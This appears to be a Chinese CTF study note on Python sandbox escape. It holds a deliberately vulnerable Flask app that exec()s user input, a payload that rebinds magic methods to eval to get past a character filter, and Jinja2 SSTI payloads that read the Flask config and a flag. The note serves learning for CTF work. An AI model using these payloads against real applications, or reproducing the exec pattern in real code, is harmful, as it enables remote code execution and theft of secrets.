# python 沙箱逃逸

在xman个人排位赛的时候第一次见到这种题

## 推荐网站

[https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/](https://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)

[https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-沙箱逃逸/)



 https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__init__ 

## 关键函数

### getattr

`getattr`(*object*, *name*[, *default*])

返回对象命名属性的值。*name* 必须是字符串。如果该字符串是对象的属性之一，则返回该属性的值。例如， `getattr(x, 'foobar')` 等同于 `x.foobar`。如果指定的属性不存在，且提供了 *default* 值，则返回它，否则触发 [`AttributeError`](https://docs.python.org/zh-cn/3/library/exceptions.html#AttributeError)。

获得对象属性的值相当于拷贝对象属性的副本，如果这个对象的属性的值是一个函数呢？

fun=getattr(os,'system')则fun()=system()





## 过滤 (或)

利用魔术方法绕过，常见的如:`__eq__,__ne__,__getitem__...`

例如：

```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/', methods=["POST"])
def security():
    secret = request.form["cmd"]
    for i in secret:
        if not 42 <= ord(i) <= 122: 
            print(i)
            return "error!"

    exec(secret)
    return "xXXxXXx"
```



```python
request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
```

## flask

url_for

### 获取config

```
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}

{{config}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}

```



